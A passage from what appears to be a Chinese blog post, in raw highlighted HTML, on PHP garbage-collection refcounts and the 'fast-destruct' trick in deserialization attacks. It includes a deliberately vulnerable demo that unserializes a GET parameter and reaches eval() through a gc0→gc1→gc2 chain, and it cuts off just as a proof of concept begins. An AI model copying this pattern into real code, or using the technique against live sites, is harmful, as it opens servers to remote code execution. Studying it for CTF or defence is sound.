</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;life&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=mi>42</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-gc-mechanism-and-common-exploitation/QQ20240914-192252.png width=689 height=219 loading=lazy alt=1></p><p>一样的增加</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span> <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;life&#39;</span><span class=p>,</span> <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=mi>42</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;life&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;meaning&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span> <span class=s1>&#39;a&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>3</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;life&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=mi>42</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;life&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>3</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;life&#39;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>啊？怎么回事，直接就暴涨到了3，解析一下发现原来确实是进行了三次引用</p><ul><li><strong>数组 <code>$a['meaning']</code></strong>：第一个引用。</li><li><strong>数组 <code>$a['life']</code></strong>：第二个引用。</li><li><strong>PHP 引擎符号表中的缓存</strong>：为了优化性能，PHP 对常见的字符串（比如 <code>'life'</code>）会缓存，以避免重复创建相同的字符串值。这是 PHP 引擎的一种内存优化技术。</li></ul><p><img src=/p/php-gc-mechanism-and-common-exploitation/QQ20240914-193033.png width=684 height=211 loading=lazy alt=2></p><p>进行地址的引用的话不出意外应该是2，就像标量一样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span> <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;life&#39;</span><span class=p>,</span> <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=mi>42</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;life&#39;</span><span class=p>]</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;meaning&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span> <span class=s1>&#39;a&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;life&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=mi>42</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;life&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;life&#39;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>确实如此</p><p>删除的话也是如此</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span> <span class=s1>&#39;meaning&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;life&#39;</span><span class=p>,</span> <span class=s1>&#39;number&#39;</span> <span class=o>=&gt;</span> <span class=mi>42</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;life&#39;</span><span class=p>]</span><span class=o>=&amp;</span><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;meaning&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>unset</span><span class=p>(</span><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;meaning&#39;</span><span class=p>],</span><span class=nv>$a</span><span class=p>[</span><span class=s1>&#39;number&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span> <span class=s1>&#39;a&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;life&#39;</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;life&#39;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>还有一种特殊情况就是添加数组本身</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span> <span class=s1>&#39;one&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=p>[]</span> <span class=o>=&amp;</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span> <span class=s1>&#39;a&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=k>array</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;one&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mi>1</span> <span class=o>=&gt;</span> <span class=p>(</span><span class=nx>refcount</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=nx>is_ref</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=o>=...</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-gc-mechanism-and-common-exploitation/QQ20240914-193602.png width=633 height=223 loading=lazy alt=3></p><p>首先为什么是2，很容易理解就是我们这个数组里面确实是有两个变量，而<code>$a[1]</code>的引用为<code>1</code>，是因为数组的自引用</p><h3 id=回收周期>回收周期</h3><p>在php5.3之前，GC回收是仅仅依靠引用计数来进行的，但是这样子造成了一个很严重的漏洞(循环引用问题)</p><h4 id=php-52>php &lt;=5.2</h4><p>该版本及之前的垃圾回收机制就是单纯的使用<strong>引用计数</strong>方法。但是注意，当两个或多个对象互相引用形成循环，内存对象的refcount计数器并不会消减为0，也就就是说，此时这组内存对象已经没有被使用，但又不能回收，因此出现内存泄露现象。</p><h4 id=php-5356>php 5.3&ndash;>5.6</h4><p>php5.3开始，使用了新的垃圾回收机制，在 <strong>引用计数</strong> 基础上，实现了一种复杂的算法，来检测内存对象中<strong>循环引用</strong>存在，以避免内存泄露。</p><p>在这些版本中，PHP把那些可能是垃圾的变量容器放入根缓冲区，当根缓冲区满了之后就会启动新的垃圾回收机制。过程如下：</p><blockquote><p>如果发现一个zval容器中的refcount在增加，说明不是垃圾；
如果发现一个zval容器中的refcount在减少，如果减到了0，直接当做垃圾回收；
如果发现一个zval容器中的refcount在减少，并没有减到0，PHP会把该值放到缓冲区，当做有可能是垃圾的怀疑对象；
当缓冲区达到临界值，PHP会自动调用一个方法取遍历每一个值，如果发现是垃圾就清理。</p></blockquote><h4 id=php70>php>=7.0</h4><p>从PHP7的NTS版本开始，以下例程的引用将不再被计数，即 $c=$b=$a 之后 a 的引用计数也是1。</p><p>具体情况如下：</p><blockquote><p>1.对于null，bool，int和double的类型变量，refcount永远不会计数；
2.对于对象、资源类型，refcount计数和php5的一致；
3.对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串被重复删除（即只有一个带有特定内容的被插入的字符串）并保证在请求的整个持续时间内存在，所以不需要为它们使用引用计数；如果使用了opcache，这些字符串将存在于共享内存中，在这种情况下，您不能使用引用计数（因为我们的引用计数机制是非原子的）；
4.对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。再次，这些生活在共享内存，因此不能使用refcounting。</p></blockquote><p>也就是我们这次的实验环境</p><h2 id=反序列化的利用>反序列化的利用</h2><p>那么，说到底GC回收机制有什么能利用的点呢，这就需要联系起PHP的魔术方法__destrcut函数,在程序结束后php会自动调用__destruct进行自动销毁，如果程序报错或者抛出异常则不会触发__destruct。先来简单看看实际情况下GC回收机制的工作。</p><h3 id=php>php</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>=</span><span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct(&#34;</span><span class=o>.</span><span class=nv>$num</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;destruct(&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>construct</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>construct</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>destruct</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>destruct</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>destruct</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这里都是进行了变量的 引用的所以正常的进行魔术方法触发</p><p>而我们稍微修改一下，比如不引用看看呢</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>=</span><span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct(&#34;</span><span class=o>.</span><span class=nv>$num</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;destruct(&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>construct</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>destruct</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>construct</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>construct</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>destruct</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>destruct</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>发现直接就把<code>(1)</code>给销毁了,也就是<code>fast-destruct</code></p><h4 id=绕过异常类>绕过异常类</h4><p>那么给个数组中利用的例子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>=</span><span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;construct(&#34;</span><span class=o>.</span><span class=nv>$num</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;destruct(&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>.</span><span class=s2>&#34;)&#34;</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$arr</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=mi>0</span><span class=o>=&gt;</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=o>=&gt;</span><span class=k>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>xdebug_debug_zval</span><span class=p>(</span><span class=s1>&#39;arr&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>也是成功的销毁了</p><h5 id=demo-1>Demo 1</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc0</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>.</span><span class=s2>&#34;hello __destruct&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc1</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;hello __toString&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>string</span><span class=o>-&gt;</span><span class=na>flag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;useless&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc2</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>flag</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;hello __flag()&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;Garbage collection&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gc0::destruct-&gt;gc1::toString-&gt;gc2::flag
</span></span></code></pre></td></tr></table></div></div><p>poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
